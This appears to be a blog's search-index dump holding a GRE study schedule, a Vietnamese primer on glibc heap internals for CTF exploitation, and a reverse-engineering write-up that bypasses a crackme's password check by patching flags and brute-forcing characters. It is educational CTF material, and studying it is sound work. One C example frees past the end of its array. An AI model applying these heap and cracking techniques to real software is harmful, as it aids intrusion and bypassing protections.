[{"categories":null,"content":"Introduction I remember when I started my GRE journey to build my profile for studying abroad, finding the right materials was a big challenge for me. Thankfully, a friend shared her amazing resources, and it was a great help. I believe the GRE is not super difficult. Because it’s a standardized test, the question formats are always the same. As long as you understand the methods to solve them, you will do well. ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:1:0","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Study Plan My study schedule is based entirely on Magoosh. I will update this blog with all the course videos at the earliest opportunity. ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:0","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Week 1, Day 1 General Introduction to the GRE​: 6 minutes What’s on the GRE?​: 5 minutes Intro - Math Section Breakdown​: 3 minutes Intro - Verbal Section Breakdown​: 4 minutes Intro - Scoring Range​: 2 minutes Intro - Computer Adaptive Testing​: 2 minutes Intro - Skipping Questions and Pacing​: 8 minutes Intro - Study Plans and Resources​: 3 minutes Intro - Stress Management​: 8 minutes Intro - Test Day​: 4 minutes Math - Intro to GRE Math​: 5 minutes Math - Mental Math: GRE Estimation​: 4 minutes Math - Mental Math: Dividing by 5​: 2 minutes Math - Mental Math: Doubling and Halving​: 6 minutes Math - Mental Math: Squaring Shortcuts​: 12 minutes ​ Verbal - Intro to Text Completions​: 4 minutes Verbal - Elimination Method​: 6 minutes ​ Verbal - Understanding the Sentence​: 4 minutes ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:1","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Week 1, Day 2 Math - Number Sense​: 10 minutes Math - The Use and Abuse of Formulas​: 2 minutes Math - Learn From Your Mistakes​: 4 minutes Math - Intro to Quantitative Comparison​: 13 minutes Math - QC Strategies-Estimation​: 10 minutes Math - QC Strategies-Matching Operations​: 7 minutes Math - Properties of Real Numbers​: 8 minutes Math - Positive and Negative Numbers I​: 6 minutes Math - Mental Math, Addition, and Subtraction​: 6 minutes Math - Positive and Negative Numbers II​: 10 minutes Verbal - Difficult Words​: 9 minutes ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:2","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Week 1, Day 3 Math - Order of Operations​: 11 minutes Math - Intro to Decimals​: 11 minutes Math - Rounding​: 6 minutes Math - Multiples of 10​: 9 minutes Math - Intro to Fractions​: 11 minutes Math - Conversions: Fractions and Decimals​: 8 minutes Math - Fraction Properties I​: 8 minutes Math - Comparing Fractions I​: 10 minutes Math - Comparing Fractions II (Advanced)​: 10 minutes Math - Operations with Fractions​: 8 minutes ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:3","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Week 1, Day 4 Math - Fraction Properties II​: 7 minutes Math - Mixed Numerals and Improper Fractions​: 10 minutes Math - Operations with Proportions​: 6 minutes Math - Word Problems with Fractions​: 3 minutes Quiz: ​Arithmetic and Fractions​: 7 minutes Math - Intro to Percents​: 5 minutes Math - Working with Percents​: 3 minutes Math - Number Sense and Percents​: 4 minutes Math - Percent Increases and Decreases​: 10 minutes Math - Sequential Percent Changes​: 6 minutes Math - Simple and Compound Interest​: 13 minutes ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:4","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Week 1, Day 5 Math - Intro to Ratios​: 9 minutes Math - Combining Ratios​: 11 minutes Math - Ratios and Rates​: 6 minutes Quiz: ​Percents and Ratios​: 7 minutes Math - Divisibility​: 10 minutes Math - Divisibility Rules​: 8 minutes Math - Multiples: 8 minutes​ Math - Prime Numbers​: 6 minutes Math - Prime Factorization​: 8 minutes (OPTIONAL)​ Math - Counting Factors of Large Numbers​: 12 minutes Math - Squares of Integers​: 5 minutes Verbal - Double Shifts​: 3 minutes Verbal - Time Shifts​: 4 minutes (OPTIONAL)​ Verbal - Shifts in Perception​: 2 minutes (OPTIONAL)​ Verbal - Multiple Shifts​: 4 minutes ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:5","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Week 1, Day 6 Math - Greatest Common Factor​: 5 minutes Math - Least Common Multiple​: 9 minutes (OPTIONAL)​ GCD LCM Formula​: 5 minutes Math - Even and Odd Integers​: 10 minutes Math - Testing Cases​: 5 minutes Writing - Intro to Analytical Writing Section (AWA)​: 5 minutes Writing - Essay Organization​: 3 minutes Writing - Writing Tips​: 12 minutes Writing - Time Management​: 4 minutes Writing - Intro to Issue Task​: 7 minutes Writing - Issue Task Example​: 12 minutes Writing - Intro to Argument Task​: 3 minutes Writing - Logical Fallacies​: 9 minutes Writing - Argument Task Brainstorming​: 6 minutes Writing - Argument Task Example​: 9 minutes ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:6","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Week 2, Day 1 Math - Consecutive Integers​: 9 minutes (OPTIONAL)​ Math - Remainders​: 11 minutes (OPTIONAL)​ Math - Integer Properties Strategies​: 6 minutes Quiz: ​Integer Properties​: 7 minutes Math - Intro to Algebra​: 7 minutes Math - Simplifying Expressions​: 6 minutes Math - Multiplying Expressions​: 7 minutes Math - FOIL Method​: 8 minutes (OPTIONAL)​ Math - Factoring-GFC​: 5 minutes Math - Factoring: Difference of Two Squares​: 12 minutes (OPTIONAL)​ Math - Factoring-Quadratics​: 7 minutes Verbal - False Contrast​: 7 minutes Verbal - Deviating From the Norm​: 5 minutes (OPTIONAL)​ Verbal - Reverse Apposition​: 2 minutes Quiz: ​Text Completion-Sentence Shifts​: 7 minutes Verbal - Intro to Double Blank Sentences​: 7 minutes ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:7","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Week 2, Day 2 Math - Factoring-Combined​: 4 minutes (OPTIONAL)​ Math - Advanced Numerical Factoring​: 7 minutes (OPTIONAL)​ Math - Factoring-Rational Expressions​: 5 minutes Basic Equation Solving​: 6 minutes Math - Eliminating Fractions​: 9 minutes (OPTIONAL) ​Math - Quadratic Equations​: 8 minutes Math - Two Equations, Two Unknowns-1​: 7 minutes (OPTIONAL) Math - Two Equations, Two Unknowns-II​: 10 minutes (OPTIONAL) Math - System-Number of Solutions​: 7 minutes (OPTIONAL) Math - Three Equations with Three Unknowns​: 9 minutes Verbal - Multiple Sentences​: 7 minutes Verbal - Relationship Between Blanks​: 3 minutes Verbal - Back to Back Blanks​: 5 minutes Verbal - Other Blank is the Clue​: 5 minutes ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:8","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Week 2, Day 3 Math - Absolute Value Equations​: 10 minutes Math - Function Notation​: 12 minutes Math - Strange Operators​: 7 minutes Math - Inequalities-I​: 13 minutes Math - Inequalities-II: 11 minutes​ Math - Absolute Value Inequalities​: 9 minutes Math - Simplifying with Substitutions​: 5 minutes Quiz: ​Algebra, Equations, and Inequalities​: 7 minutes Math - Intro to Word Problems​: 1 minute Math - Assigning Variables​: 9 minutes Math - Writing Equations​: 7 minutes (OPTIONAL) ​Verbal - Advanced Double Blanks​: 5 minutes Quiz: ​Text Completion-Double Blanks​: 7 minutes Verbal - Intro to Triple Blank Sentences​: 4 minutes Verbal - Long Triple Blank Sentences​: 5 minutes Verbal - Beware of Counterintuitive Choices​: 3 minutes ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:9","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Week 2, Day 4 (OPTIONAL) ​Math - Number of Variables​: 8 minutes (OPTIONAL) ​Math - Age Questions​: 5 minutes Math - Intro to Motion Questions​: 9 minutes Math - Average Speed​: 10 minutes (OPTIONAL) ​Math - Multiple Traveler Questions​: 9 minutes Math - Shrinking and Expanding Gaps​: 12 minutes Math - Work Questions​: 9 minutes (OPTIONAL) ​Math - Growth and Decay​: 4 minutes (OPTIONAL) ​Math - Mixture Questions​: 10 minutes Math - Intro to Sets and Venn Diagrams​: 9 minutes Verbal - One Sentence Triple Blank​: 7 minutes (OPTIONAL) ​Verbal - Advanced Triple Blanks​: 9 minutes (OPTIONAL) ​Verbal - Hidden Clues​: 3 minutes (OPTIONAL) ​Verbal - Multiple Word Answers​: 4 minutes ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:10","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Week 2, Day 5 (OPTIONAL) ​Math - Double Matrix Method​: 9 minutes (OPTIONAL) ​Math - Three Criteria Venn Diagrams​: 7 minutes Math - Intro to Sequences​: 7 minutes Math - Arithmetic Sequences​: 8 minutes (OPTIONAL) ​Math - Recursive Sequences​: 10 minutes Math - Inclusive Counting​: 4 minutes Math - Sums of Sequences​: 7 minutes Math - Backsolving​: 7 minutes Math - Picking Numbers​: 13 minutes Verbal-Working Backwards​: 6 minutes Quiz: ​Text Completion–Triple Blanks​: 7 minutes Verbal – Intro to Sentence Equivalence​: 3 minutes Verbal - Synonymous Sentences I​: 4 minutes Verbal - Synonymous Sentences II​: 4 minutes ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:11","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Week 2, Day 6 1 Essay ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:2:12","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"Documents ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:3:0","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"1. Analytical Writing ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:3:1","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"2. Verbal Reasoning Official GRE Verbal Reasoning Practice Questions ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:3:2","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":"3. Quantitative Reasoning GRE 1 Algebra GRE 2 Fractions, Decimals and Percents GRE 3 Geometry GRE 4 Number Properties GRE 5 Word Problems GRE 6 Quantitative Comparisons \u0026 Data Interpretation GRE 7 Reading Comprehension \u0026 Essays GRE 8 TC \u0026 SE ","date":"2025-10-12","objectID":"/graduate-record-examinations-notes/:3:3","tags":[],"title":"Graduate Record Examinations (GRE) Notes","uri":"/graduate-record-examinations-notes/"},{"categories":null,"content":" img { box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px; border-radius: 6px; display: block; margin: 0 auto 15px; } Nội dung bài viết sẽ không đi sâu vào nghiên cứu các cơ chế hoạt động của Heap. Thay vào đó là những nội dung khái quát, vừa đủ để người chơi có thể làm quen được với các dạng bài Heap Exploitation trong Capture The Flag. ","date":"2025-10-07","objectID":"/2025-heap_ctf_theory/:0:0","tags":["Pwnable"],"title":"Heap CTF Theory","uri":"/2025-heap_ctf_theory/"},{"categories":null,"content":"0x1 Malloc Chunk Khi chương trình gọi hàm malloc/calloc, một vùng nhớ mới sẽ được tạo ra gọi là heap chunk. Cấu trúc của một chunk sẽ gồm 2 phần: heap metadata và heap content. Phần 1 - Heap Metadata: Có kích thước 0x8/0x10 bytes (đối với binary 32/64 bits), chứa các thông tin như là: chunk size, flag mode, previous size. Trong phạm vi bài viết này, mình sẽ chỉ làm việc với binary 64 bits. Previous Size: Nằm ở 8 bytes đầu tiên của chunk. Chứa kích thước của chunk được free trước nó. Chunk size: Nằm ở 8 bytes tiếp theo của chunk. Chứa kích thước của chunk hiện tại (tính cả metadata). Flag mode: Là bit thể hiện trạng thái của chunk, được cộng vào chunk size nhưng không làm ảnh hưởng tới kích thước thật sự của chunk. Bao gồm 3 trạng thái: Previous chunk in use [0x1]: Bit này được thêm vào khi chunk phía trước đang được sử dụng. Is mmapped [0x2]: Kích thước chunk yêu cầu vượt quá kích thước của top chunk dẫn tới việc phải cấp phát động qua hàm mmap(). Non in main arena [0x4]: Chương trình luôn tồn tại main arena nhưng đối với chương trình multi-threading thì mỗi thread lại dùng arena riêng. Vì thế, bit này được bật khi heap chunk không nằm trong main arena. Phần 2 - Heap Content: Chứa nội dung của heap chunk. Ví dụ: malloc 2 chunk với kích thước 0x20, tính thêm cả metadata là 0x30. Các chunk này đều có bit Previous chunk in use [0x1]. ","date":"2025-10-07","objectID":"/2025-heap_ctf_theory/:1:0","tags":["Pwnable"],"title":"Heap CTF Theory","uri":"/2025-heap_ctf_theory/"},{"categories":null,"content":"0x2 Binning Khi một heap chunk được free, nó sẽ được đẩy vào các bin tương ứng. Bin được định nghĩa là các vùng nhớ chứa các chunk được giải phóng, giúp chương trình thuận tiện cấp phát lại bộ nhớ mới khi có yêu cầu. Có tổng cộng 5 bin đó là: Fast Bin, Tcache Bin, Unsorted Bin, Small Bin, Large Bin. ","date":"2025-10-07","objectID":"/2025-heap_ctf_theory/:2:0","tags":["Pwnable"],"title":"Heap CTF Theory","uri":"/2025-heap_ctf_theory/"},{"categories":null,"content":"1. Fast Bin Fast Bin có cấu trúc là danh sách liên kết đơn, chứa các chunk được free có kích thước từ [0x20, 0x80] (đã tính metadata) và hoạt động theo cơ chế LIFO - được đẩy vào sau sẽ được lấy ra trước, tương tự như cơ chế của stack. ","date":"2025-10-07","objectID":"/2025-heap_ctf_theory/:2:1","tags":["Pwnable"],"title":"Heap CTF Theory","uri":"/2025-heap_ctf_theory/"},{"categories":null,"content":"2. Tcache Bin Được xuất hiện từ phiên bản Glibc 2.26, có cấu trúc tương tự như Fast Bin truyền thống. Ưu điểm so với Fast Bin đó là giữa các tiến trình sẽ phải dùng chung một Fast Bin nhưng với Tcache thì mỗi thread đều có Tcache riêng nên sẽ tối ưu hơn cho việc cấp phát lại các chunk. Khi free một chunk có kích thước [0x20, 0x410] (đã thêm metadata) thì chunk đó sẽ được ưu tiên đẩy vào Tcache Bin trước. Cấu trúc của Tcache Bin là một danh sách liên kết đơn và hoạt động theo cơ chế LIFO tương tự Fast Bin. Đối với từng kích thước, Tcache Bin sẽ chỉ chứa tối đa được 7 chunks, đây cũng chính là nhược điểm của Tcache Bin. Ví dụ đoạn mã sau đây, malloc liên tục 8 chunks và sau đó free hết cả 8 chunks. #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int main() { char *ptr[8]; for (int i = 0; i \u003c 8; i++) { ptr[i] = malloc(0x20); } for (int i = 0; i \u003c 8; i++) { free(ptr[i]); } } Sau khi free 7 chunks có size 0x30 liên tiếp, chúng sẽ được chứa ở Tcache Bin, chunk thứ 8 sẽ bị đẩy vào Fast Bin. Khi free một chunk, 16 byte đầu ở Heap Content sẽ bị ghi đè. 8 byte đầu: chứa giá trị được tính toán bởi cơ chế Safe Linking (có từ phiên bản 2.32) của Tcache theo công thức: $$ v = pa \\oplus (a \\gg 12) $$ trong đó: $v$: giá trị ở 8 byte đầu sau khi free. $pa$ - previous address: địa chỉ chunk được free trước đó, nếu là chunk đầu tiên được free thì $pa = 0$. $a$: địa chỉ của chunk hiện tại. Ví dụ khi free chunk thứ 2: $pa$ = 0x5555555592a0 $a$ = 0x5555555592d0 $v$ = 0x5555555592a0 ^ (0x5555555592d0 » 12) = 0x55500000c7f9 8 bytes sau: một giá trị Key ngẫu nhiên nhằm chống lại kỹ thuật khai thác Double Free. ","date":"2025-10-07","objectID":"/2025-heap_ctf_theory/:2:2","tags":["Pwnable"],"title":"Heap CTF Theory","uri":"/2025-heap_ctf_theory/"},{"categories":null,"content":"3. Unsorted Bin | Small Bin | Large Bin Ba loại bin này có mối quan hệ chặt chẽ với nhau, chúng được lưu trữ trong cùng một mảng nhưng có các vị trí khác nhau: Unsorted Bin: 0x01 Small Bin: 0x02 → 0x3F Large Bin: 0x40 → 0x7E Unsorted Bin là nơi chứa các chunk được free với size \u003e 0x410 (không vào được Tcache Bin) hoặc size = [0x80 - 0x410] (không vào được Fast Bin, vào được Tcache Bin nhưng đã đầy 7 chunks). Cấu trúc của nó là danh sách liên kết đôi và sẽ xử lý chunk sau khi được free theo 2 cách: Gộp chunk. Trỏ tới chunk kế tiếp. Cách 1: Gộp chunk Nếu 2 chunks ở cạnh nhau trong Unsorted Bin, được free liên tiếp thì chúng sẽ được gộp lại thành 1 chunk. Ví dụ malloc 2 chunks size 0x410 và free liên tiếp. Kết quả sẽ được một chunk có size 0x840 (đã tính metadata) trong Unsorted Bin. #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int main() { char *ptr[2]; for (int i = 0; i \u003c 2; i++) { ptr[i] = malloc(0x410); } for (int i = 0; i \u003c 8; i++) { free(ptr[i]); } } Sau khi malloc 2 chunk trên pwndbg\u003e heap Allocated chunk | PREV_INUSE Addr: 0x555555559000 Size: 0x290 (with flag bits: 0x291) Allocated chunk | PREV_INUSE Addr: 0x555555559290 Size: 0x420 (with flag bits: 0x421) Allocated chunk | PREV_INUSE Addr: 0x5555555596b0 Size: 0x420 (with flag bits: 0x421) Lần lượt free từng chunk một, kết quả sẽ cho ta thấy có sự gộp chunk. ======================= ==== Chunk 1 freed ==== ======================= pwndbg\u003e heap Allocated chunk | PREV_INUSE Addr: 0x555555559000 Size: 0x290 (with flag bits: 0x291) Free chunk (unsortedbin) | PREV_INUSE Addr: 0x555555559290 Size: 0x420 (with flag bits: 0x421) fd: 0x7ffff7f9fce0 bk: 0x7ffff7f9fce0 Allocated chunk Addr: 0x5555555596b0 Size: 0x420 (with flag bits: 0x420) ======================= ==== Chunk 2 freed ==== ======================= pwndbg\u003e heap Allocated chunk | PREV_INUSE Addr: 0x555555559000 Size: 0x290 (with flag bits: 0x291) Free chunk (unsortedbin) | PREV_INUSE Addr: 0x555555559290 Size: 0x840 (with flag bits: 0x841) fd: 0x7ffff7f9fce0 bk: 0x7ffff7f9fce0 Cách 2: Trỏ tới chunk kế tiếp Khi giữa 2 chunk được free có một chunk đứng giữa làm “ranh giới” thì sẽ không còn hiện tượng gộp chunk. Thay vào đó các chunk sẽ nối tiếp với nhau trong danh sách liên kết đôi. Ví dụ: malloc đan xen các chunk có size 0x20 và 0x410. Sau đó free liên tiếp các chunk có size 0x410. #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int main() { char *ptr1[8]; char *ptr2[8]; for (int i = 0; i \u003c 3; i++) { ptr2[i] = malloc(0x20); ptr1[i] = malloc(0x410); } for (int i = 0; i \u003c 3; i++) { free(ptr1[i]); } return 0; } Kết quả cho thấy con trỏ bk và fd của các chunk được free trỏ tới nhau mà không bị gộp. Khi một chunk được yêu cầu malloc, nếu Tcache Bin và Fast Bin không đáp ứng được, Unsorted Bin sẽ được xem xét đến. Có 2 trường hợp xảy ra là: Size của chunk được malloc (#1) \u003c Size của chunk trong Tcache Bin (#2) → Cắt một phần của Chunk #2 cho Chunk #1. Ngược lại, bộ nhớ sẽ trích từ Top Chunk ra cho Chunk #1, đồng thời thực hiện đưa: Chunk có size [0x20 - 0x410] trong Unsorted Bin → đưa vào Small Bin. Chunk có size \u003e 0x410 (#3) trong Unsorted Bin → đưa vào Large Bin. Chunk trong Fast Bin Nếu liền kề với chunk #3 → gộp chunk và cùng đưa vào Large Bin. Ngược lại → đưa vào Small Bin. ","date":"2025-10-07","objectID":"/2025-heap_ctf_theory/:2:3","tags":["Pwnable"],"title":"Heap CTF Theory","uri":"/2025-heap_ctf_theory/"},{"categories":null,"content":"0x3 Top Chunk Top chunk là vùng nhớ lớn cuối cùng của heap dùng để giữ các khối bộ nhớ chưa được phân bổ. Khi có một yêu cầu cấp phát bộ nhớ, trình quản lý heap sẽ tìm kiếm các khối bộ nhớ đủ rộng để cấp phát. Nếu không đủ lớn, top chunk sẽ cắt một phần của mình và trả về vùng nhớ mới. pwndbg\u003e heap Allocated chunk | PREV_INUSE Addr: 0x555555559000 Size: 0x290 (with flag bits: 0x291) Free chunk (tcachebins) | PREV_INUSE Addr: 0x555555559290 Size: 0x20 (with flag bits: 0x21) fd: 0x555555559 Allocated chunk | PREV_INUSE Addr: 0x5555555592b0 Size: 0x20 (with flag bits: 0x21) Top chunk | PREV_INUSE Addr: 0x5555555592d0 Size: 0x20d30 (with flag bits: 0x20d31) ","date":"2025-10-07","objectID":"/2025-heap_ctf_theory/:3:0","tags":["Pwnable"],"title":"Heap CTF Theory","uri":"/2025-heap_ctf_theory/"},{"categories":null,"content":"0x4 References [1]. Heap Exploitation Nightmare ","date":"2025-10-07","objectID":"/2025-heap_ctf_theory/:4:0","tags":["Pwnable"],"title":"Heap CTF Theory","uri":"/2025-heap_ctf_theory/"},{"categories":null,"content":"VCS Training RE","date":"2025-10-01","objectID":"/2025-vcs/","tags":["Reverse-Engineering"],"title":"VCS Training RE","uri":"/2025-vcs/"},{"categories":null,"content":"\rimg {\rbox-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;\rborder-radius: 6px;\rdisplay: block; margin: 0 auto 15px;\r}\r\r","date":"2025-10-01","objectID":"/2025-vcs/:0:0","tags":["Reverse-Engineering"],"title":"VCS Training RE","uri":"/2025-vcs/"},{"categories":null,"content":"week 1/crackme1 Challenge Information Given files: crack_me1.exe ","date":"2025-10-01","objectID":"/2025-vcs/:1:0","tags":["Reverse-Engineering"],"title":"VCS Training RE","uri":"/2025-vcs/"},{"categories":null,"content":"0x01 Overview Decompile bằng IDA32, ta thu được pseudo-code của hàm main() như sau int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+0h] [ebp-2CCh] char v5; // [esp+0h] [ebp-2CCh] char v6; // [esp+0h] [ebp-2CCh] char Format[160]; // [esp+8h] [ebp-2C4h] BYREF char input; // [esp+A8h] [ebp-224h] BYREF char v9[299]; // [esp+A9h] [ebp-223h] BYREF char v10[200]; // [esp+1D4h] [ebp-F8h] BYREF void *v11; // [esp+29Ch] [ebp-30h] int v12; // [esp+2A0h] [ebp-2Ch] int v13; // [esp+2A4h] [ebp-28h] char *v14; // [esp+2A8h] [ebp-24h] int v15; // [esp+2ACh] [ebp-20h] char *v16; // [esp+2B0h] [ebp-1Ch] int v17; // [esp+2B4h] [ebp-18h] int v18; // [esp+2B8h] [ebp-14h] char *p_input; // [esp+2BCh] [ebp-10h] char *addrInput; // [esp+2C0h] [ebp-Ch] int i; // [esp+2C8h] [ebp-4h] input = 0; memset(v9, 0, sizeof(v9)); v12 = 335; memset(v10, 0, sizeof(v10)); strcpy( Format, \"Do you remember the good old days?! I don't know how about you,but I don't. Please help me to recover my memory, it'\" \"s password protected, and that's sad :(\\n\"); v11 = \u0026byte_864BE8; printf(Format, v4); printf(\"Enter password: \", v5); scanf(\"%300[^\\n]s\", (char)\u0026input); addrInput = \u0026input; v16 = v9; addrInput += strlen(addrInput); v15 = ++addrInput - v9; v17 = addrInput - v9; p_input = \u0026input; v14 = v9; p_input += strlen(p_input); v13 = ++p_input - v9; if ( (unsigned int)(p_input - v9) \u003e= 294 ) { if ( checkInput(\u0026input) ) { v18 = v17 / 3; for ( i = 0; i \u003c v17; ++i ) v10[i % v18] ^= v9[i - 1]; for ( i = 0; i \u003c v12; ++i ) byte_864020[i] ^= v10[i % v18]; printf(\"\\n\\nCongratulation! Here is your memo :\u003e \\n\\n\", v6); printf(\"%s\", (char)byte_864020); } else { printf(\"\\nInvalid password\\n\", v6); } getchar(); getchar(); return 0; } else { printf(\"oh, no!\", v6); return 0; } } Chương trình cho phép nhập vào tối đa 300 ký tự (không tính \\n) và bắt đầu check input nếu độ dài ≥ 294. Ngược lại, chương trình sẽ in ra oh, no! Nếu input của chúng ta hợp lệ, flag sẽ được in ra tại đoạn mã này. v18 = v17 / 3; for ( i = 0; i \u003c v17; ++i ) v10[i % v18] ^= v9[i - 1]; for ( i = 0; i \u003c v12; ++i ) byte_864020[i] ^= v10[i % v18]; printf(\"\\n\\nCongratulation! Here is your memo :\u003e \\n\\n\", v6); printf(\"%s\", (char)byte_864020); ","date":"2025-10-01","objectID":"/2025-vcs/:1:1","tags":["Reverse-Engineering"],"title":"VCS Training RE","uri":"/2025-vcs/"},{"categories":null,"content":"0x02 Static Analysis Chúng ta bắt đầu đi sâu hơn vào hàm checkInput() để phân tích chức năng của nó. char __cdecl checkInput(const char *input) { int i; // [esp+14h] [ebp-10h] _DWORD *byteStr; // [esp+18h] [ebp-Ch] byteStr = \u0026unk_404BE8; if ( (int)strlen(input) \u003c 55 ) return 0; for ( i = 0; i \u003c 122; ++i ) { if ( !(unsigned __int8)execCheck(*byteStr, \u0026input[byteStr[1]], byteStr + 2) ) return 0; byteStr += 3; } return 1; } Chương trình khởi tạo một byteStr, kiểm tra độ dài input một lần nữa và bắt đầu thực hiện biến đổi 122 rounds. Sau mỗi round, byteStr sẽ tăng thêm 3 đơn vị, mỗi DWORD có kích thước 4 byte. Vậy mỗi round cần dùng 12 byte → kích thước của byteStr sẽ là 12 * 122 = 1464 (bytes). Trong mỗi round, hàm execCheck() sẽ được gọi với 3 đối số. execCheck(*(_DWORD *)byteStr, (char *)\u0026input[*((_DWORD *)byteStr + 1)], byteStr + 8) Với kiểu dữ liệu DWORD trong IDA, mỗi đối số sẽ có kích thước 4 byte. Đây là một mẩu chuỗi byte nhỏ trong byteStr. Để biết chính xác các đối số đó làm nhiệm vụ gì, chúng ta sẽ đi phân tích hàm execCheck(). char __cdecl execCheck(int caseIndex, char *subInput, char *initString) { char v4[4]; // [esp+0h] [ebp-20h] BYREF LPVOID v5; // [esp+4h] [ebp-1Ch] LPVOID v6; // [esp+8h] [ebp-18h] SIZE_T v7; // [esp+Ch] [ebp-14h] SIZE_T v8; // [esp+10h] [ebp-10h] LPVOID lpAddress; // [esp+14h] [ebp-Ch] SIZE_T dwSize; // [esp+18h] [ebp-8h] char v11; // [esp+1Fh] [ebp-1h] v8 = 221; v5 = sub_861000((int)\u0026unk_864288, 221, 5); v7 = 278; v6 = sub_861000((int)\u0026unk_864170, 278, 6); if ( !v5 || !v6 ) return 0; switch ( caseIndex ) { case 1: dwSize = 97; lpAddress = sub_861000((int)\u0026unk_864B80, 97, 1); break; case 2: dwSize = 142; lpAddress = sub_861000((int)\u0026unk_864AF0, 142, 2); break; case 3: dwSize = 1685; lpAddress = sub_861000((int)\u0026unk_864458, 0x695, 3); break; case 4: dwSize = 235; lpAddress = sub_861000((int)\u0026unk_864368, 0xEB, 4); break; default: return 0; } if ( !lpAddress ) return 0; v11 = ((int (__cdecl *)(char *, char *, char *))lpAddress)(subInput, initString, v4); VirtualFree(lpAddress, dwSize, 0x8000u); VirtualFree(v5, v8, 0x8000u); VirtualFree(v6, v7, 0x8000u); return v11; } Sau một hồi quan sát, ta biết được 3 đối số đó lần lượt là: caseIndex: Có tổng cộng 4 caseIndex. Dưới đây là case 1, 1 và 2. subInput: Lấy ví dụ hình ảnh ở trên với case 2. Index của subInput là 88h, nghĩa là subInput sẽ được lấy từ input[0x88] đến hết. initString: Đây là chuỗi byte để so sánh kết quả của từng case. Chúng ta thấy switch xử lý từng case một nhưng đều chung 1 format là lpAddress = sub_861000((int)\u0026unk_864B80, 97, 1); Hàm sub_861000() thực hiện một số biến đổi và trả về cho ta là địa chỉ của hàm xử lý từng case đó tại biến lpAddress. Và đây là dòng lệnh khi hàm đó được gọi v11 = ((int (__cdecl *)(char *, char *, char *))lpAddress)(subInput, initString, v4); Nhiệm vụ của chúng ta là phải lấy được code hàm xử lý 4 case trên. Đặt breakpoint ngay tại dòng code trên, ấn F7 để đi vào trong hàm xử lý từng case. Dưới đây là một đoạn code của hàm xử lý case 1. Ấn phím p để IDA tạo function, ấn F5 để xem mã giả của hàm xử lý. Thực hiện tương tự cho các case còn lại. Lưu ý là qua từng round, do input ban đầu chúng ta nhập chưa chính xác, chương trình sẽ end khi gọi hàm execCheck(). Khi gặp câu lệnh jnz sẽ sửa lại giá trị cờ ZF từ 1 thành 0 là có thể đi tiếp vào round sau. Bây giờ, chúng ta sẽ đi phân tích cụ thể chức năng của từng hàm. checkCase1 Hàm checkCase1() sẽ XOR ký tự subInput[0] với 0x20 nếu mã ASCII của nó là chẵn và XOR với 0x52 nếu ngược lại. bool __cdecl checkCase1(char *subInput, char *initString) { char v2; // cl v2 = *subInput % 2; if ( !v2 \u0026\u0026 (*subInput ^ 0x20) == (unsigned __int8)*initString ) return 1; return v2 == 1 \u0026\u0026 (*subInput ^ 0x52) == (unsigned __int8)*initString; } Để tìm được kí tự thỏa mãn checkCase1() khá đơn giản bằng cách brute-force. def checkCase1(block): pos = block[4] + block[5] * 256 k = block[8] fsRes = k ^ 0x20 seRes = k ^ 0x52 if (0x20 \u003c= fsRes and fsRes \u003c= 0x7f and fsRes % 2 == 0): flag[pos] =","date":"2025-10-01","objectID":"/2025-vcs/:1:2","tags":["Reverse-Engineering"],"title":"VCS Training RE","uri":"/2025-vcs/"},{"categories":null,"content":"0x03 Final script Sau khi hoàn thiện việc giải mã 4 hàm rồi, ta sẽ lấy toàn bộ chuỗi byte ban đầu, chia thành từng block và xử lý theo 